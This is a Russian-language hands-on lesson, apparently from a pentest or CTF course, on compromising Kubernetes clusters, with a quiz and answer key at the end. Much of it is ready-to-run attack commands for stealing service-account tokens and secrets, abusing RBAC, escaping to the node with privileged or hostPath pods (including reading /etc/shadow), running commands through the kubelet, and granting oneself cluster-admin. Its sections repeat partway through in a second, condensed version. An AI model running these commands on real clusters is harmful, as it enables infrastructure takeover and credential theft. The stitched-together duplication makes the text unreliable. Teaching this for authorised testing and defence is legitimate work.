---
id: cloud-kubernetes-rbac
title: "Kubernetes: RBAC, service-account токены и побег из пода"
category: cloud
parent: cloud-containers-docker
difficulty: hard
order: 3
tags: [cloud, kubernetes, k8s, rbac, serviceaccount, escape, secrets]
prerequisites: [cloud-containers-docker, cloud-iam-basics]
useful_for:
  - "Атака Kubernetes-кластеров через слабый RBAC"
  - "Захват service-account токенов и эскалация"
  - "CTF и пентест облачных оркестраторов"
estimated_minutes: 55
summary: "Kubernetes — control plane облачных ворклоадов. Разбираем API server, kubeconfig, RBAC, service-account токены, аудит прав и классические атаки: privileged pod, hostPath, кража секретов и побег на ноду."
---

Kubernetes — это «ОС облачных ворклоадов»: если вы попали внутрь пода, вы уже внутри кластера, и часто до администратора — один слабый RBAC или одна привилегированная конфигурация. Урок практический: от первого токена service account до побега на ноду.

## Архитектура: что где лежит

Минимальная модель, которую надо держать в голове:

- **API server** (`:6443`) — единая точка управления; всё общение через него.
- **etcd** (`:2379`) — хранилище состояния и секретов.
- **kubelet** (`:10250`) — агент на каждой ноде, умеет `exec` в поды.
- **Поды** — запускают контейнеры; у каждого — смонтированный **service-account токен**.

Внутри пода токен лежит по пути:

```bash
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
```

## Разведка: что я могу

Первое, что делает атакующий внутри пода — узнаёт свой токен и права:

```bash
# Токен и namespace
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc

# Кто я
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NS/pods

# Проверка прав (self-subject access review)
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces
```

Если `kubectl` не установлен, есть `kubeconfig` — он может быть в `~/.kube/config` или в переменной `KUBECONFIG`. Проверяйте домашние каталоги и env-переменные подов.

## RBAC: как читать и злоупотреблять

RBAC связывает **субъект** (User/Group/ServiceAccount) → **роль** (Role/ClusterRole) → **правила** (verbs × resources). Ключевые опасные права:

| Право | Почему опасно |
|-------|---------------|
| `create pods` | Можно запустить привилегированный под → побег |
| `create pods/exec` | `kubectl exec` в чужой под = RCE |
| `get secrets` | Токены SA, пароли, ключи других сервисов |
| `create clusterrolebindings` | Выдать себе cluster-admin |
| `impersonate` | Действовать как другой субъект |
| `create pods/portforward` | Доступ к внутренним сервисам |
| `get nodes/proxy` | Прямой доступ к kubelet → exec |

```bash
# Список ролей и биндингов
kubectl get clusterrolebindings -o wide
kubectl get rolebindings -A
kubectl describe clusterrole cluster-admin

# Что разрешено моему SA (по имени)
kubectl get clusterrolebinding -o json | jq -r '
  .items[] | select(.subjects[]?.name=="<sa-name>") | .roleRef.name'
```

Частая ошибка конфигурации — **ClusterRole с `resources: ["*"]` и `verbs: ["*"]`**, забинденный на default SA в namespace.

## Кража секретов

Секреты — топ-цель. В старых кластерах они лежали как `Secret`-объекты; в новых — как projected volume. Достать секрет:

```bash
# Список секретов
kubectl get secrets -A
# Прямое чтение (base64)
kubectl get secret <name> -o jsonpath='{.data}' | jq -r 'to_entries[] |
  "\(.key)=\(.value|@base64d)"'

# Все секреты всех namespace одним махом (если есть права)
kubectl get secrets -A -o json | jq -r '
  .items[] | .metadata.namespace + "/" + .metadata.name'
```

Кража токена SA другой (более привилегированной) сервисной учётки:

```bash
# Создать под, монтирующий чужой SA
kubectl run steal --image=alpine --restart=Never \
  --overrides='{"spec":{"serviceAccountName":"<high-priv-sa>"}}' \
  --command -- sleep 3600
kubectl exec -it steal -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## Побег из пода на ноду

Побег возможен при слабых настройках. Основные векторы:

1. **privileged pod** — полный доступ к устройствам и хосту.
2. **hostPath** — монтирование `/` ноды внутрь пода.
3. **hostPID/hostNetwork** — видеть процессы/сеть хоста.
4. **docker.sock внутри пода** — управление Docker демоном.
5. **capabilities** (`SYS_ADMIN`, `SYS_PTRACE`) — обход изоляции.

```bash
# Привилегированный под с монтированием корня ноды
cat <<'YAML' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  hostPID: true
  containers:
  - name: c
    image: alpine
    command: ["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","/bin/sh","-c","id; cat /etc/shadow"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
YAML

# Если внутри пода смонтирован docker.sock:
docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host
```

Классика через `hostPath` без `nsenter`:

```bash
kubectl run h --image=alpine --restart=Never \
  --overrides='{"spec":{"volumes":[{"name":"r","hostPath":{"path":"/"}}],
  "containers":[{"name":"h","image":"alpine","volumeMounts":[{"name":"r","mountPath":"/h"}],
  "command":["sleep","3600"]}]}}'
kubectl exec -it h -- chroot /h /bin/sh
```

## kubelet и node-level доступ

Даже без прав на API можно добраться до **kubelet** на ноде (`:10250`), если он доступен:

```bash
# Проверить kubelet API (нужен клиентский сертификат или аноним)
curl -sk https://<node-ip>:10250/pods
# Через kubelet exec (если разрешено)
curl -sk https://<node-ip>:10250/run/<ns>/<pod>/<container> -d 'cmd=id'
```

Право `nodes/proxy` даёт доступ к kubelet через API server:

```bash
kubectl get --raw "/api/v1/nodes/<node>/proxy/pods"
kubectl get --raw "/api/v1/nodes/<node>/proxy/run/<ns>/<pod>/<container>" --method POST -f -
```

## Разобранный пример: от SA до cluster-admin

**Дано:** под с SA `default`, задача — стать админом.

1. Читаем токен, `kubectl auth can-i --list` → видим `create pods` в своём namespace.
2. Создаём привилегированный под (см. выше) → побег на ноду.
3. На ноде ищем `/etc/kubernetes/admin.conf` или `/var/lib/kubelet/kubeconfig` — часто содержит cluster-admin.

```bash
find / -name "*.kubeconfig" -o -name "admin.conf" 2>/dev/null
export KUBECONFIG=/etc/kubernetes/admin.conf
kubectl get nodes          # проверка: мы админ
```

4. Альтернативно — если есть `create clusterrolebindings`, биндим `cluster-admin` на свой SA:

```bash
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin \
  --serviceaccount=$NS:default
```

## Частые ошибки

- **Игнорировать `auth can-i --list`.** Это первое, что надо сделать; часто сразу видно путь.
- **Забыть про другие namespace.** Права и секреты могут быть в `kube-system`.
- **Считать токен SA статичным.** В новых кластерах это projected token с TTL (по умолчанию ~1 час) — надо успеть.
- **Пробовать побег без проверки `securityContext`.** Без privileged/hostPath/CAP_SYS_ADMIN побег не сработает.
- **Не смотреть kubelet.** Иногда API закрыт, а `:10250` — открыт.
- **Забывать про аудит.** K8s audit log фиксирует `exec`, создание подов и доступ к секретам.

## Что дальше / решение

- Есть `create pods` → пробуйте privileged/hostPath escape.
- Есть `get secrets` → собирайте токены и креды, ищите более привилегированные SA.
- Есть `nodes/proxy` или открытый kubelet → идите на ноду.
- Ничего нет → ищите kubeconfig в файловой системе, env и монтированиях.

Смежные уроки: `cloud-kubernetes-escape`, `cloud-k8s-secrets`, `cloud-docker-socket`, `cloud-k8s-admission`.

## Архитектура: что где лежит

Control plane (API server, etcd, controller-manager, scheduler) и nodes (kubelet, kube-proxy, runtime). Секреты — в etcd; SA-токены — в подах; kubelet — на ноде (10250). Понимание этого определяет путь от пода к кластеру и облаку.

## Разведка: что я могу

```bash
kubectl auth can-i --list
kubectl auth can-i get secrets
kubectl auth can-i create pods
kubectl get sa,role,rolebinding,clusterrole,clusterrolebinding -A
kubectl get secrets -A
```

## RBAC: как читать и злоупотреблять

`Role`/`RoleBinding` — в namespace, `ClusterRole`/`ClusterRoleBinding` — глобально. Опасные права: `get/list secrets`, `create pods`, `create clusterrolebindings`, `escalate`, `bind`, `impersonate`. С `create pods` в namespace с hostPath/privileged — побег. С `escalate`/`bind` — выдать себе cluster-admin.

## Кража секретов

```bash
kubectl get secret db -o jsonpath='{.data.password}' | base64 -d
# SA-токен из пода
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## Побег из пода на ноду

```bash
kubectl run pwn --image=alpine --restart=Never --overrides='{"spec":{
 "containers":[{"name":"p","image":"alpine","command":["sh","-c","sleep 1d"],
 "volumeMounts":[{"name":"h","mountPath":"/host"}]}],
 "volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'
kubectl exec -it pwn -- chroot /host sh
```

## kubelet и node-level доступ

```bash
curl -k https://NODE:10250/pods -H "Authorization: Bearer $TOKEN"
curl -k https://NODE:10250/run/ns/pod/container -d "cmd=id" -H "Authorization: Bearer $TOKEN"
```

## Разобранный пример: от SA до cluster-admin

1. Из пода читаем SA-токен.
2. `can-i --list` показывает `create clusterrolebindings` или `escalate`.
3. Создаём ClusterRoleBinding себя (SA) к `cluster-admin`.
4. Проверяем: `kubectl auth can-i '*' '*' --all-namespaces`.
5. Теперь читаем все секреты и управляем кластером.

## Частые ошибки

- Считать, что без kubeconfig нет доступа (SA-токен работает).
- Не проверять ClusterRoleBinding на `cluster-admin`.
- Забывать про kubelet.
- Не смотреть, есть ли право `impersonate`.

## Квиз

```quiz
- question: "Где внутри пода лежит токен service account?"
  options:
    - "/var/run/secrets/kubernetes.io/serviceaccount/token"
    - "/etc/passwd"
    - "/root/.kube/token"
    - "/proc/token"
  answer: 0
  explanation: "Стандартный путь projected-токена SA."
- question: "Какое RBAC-право позволяет читать чужие секреты?"
  options:
    - "get secrets"
    - "list pods"
    - "watch nodes"
    - "create events"
  answer: 0
  explanation: "get secrets даёт доступ к объектам Secret."
- question: "Что нужно в securityContext для побега через hostPath на корень ноды?"
  options:
    - "Монтирование hostPath / и, как правило, privileged"
    - "Только imagePullPolicy Always"
    - "restartPolicy Never"
    - "nodeSelector"
  answer: 0
  explanation: "hostPath на / плюс привилегии дают доступ к хосту."
- question: "Что такое kubelet и на каком порту он обычно слушает?"
  options:
    - "Агент ноды, порт 10250"
    - "Балансировщик, порт 80"
    - "DNS, порт 53"
    - "etcd, порт 2379"
  answer: 0
  explanation: "kubelet слушает 10250 и умеет exec в поды."
- question: "Как быстро узнать свои права в кластере?"
  options:
    - "kubectl auth can-i --list"
    - "kubectl delete all --all"
    - "cat /etc/hosts"
    - "kubectl version"
  answer: 0
  explanation: "SelfSubjectAccessReview показывает разрешённые действия."
```

## Где пригодится

- **Пентест облаков/оркестраторов:** путь от пода до ноды и cluster-admin.
- **CTF:** k8s-задачи с SA-токенами и escape.
- **Red team:** персистентность и lateral movement внутри кластера.
- **Blue team:** понимание, какие RBAC-права и audit-события критичны.
- **Дальше по дереву:** `cloud-kubernetes-escape`, `cloud-k8s-secrets`.
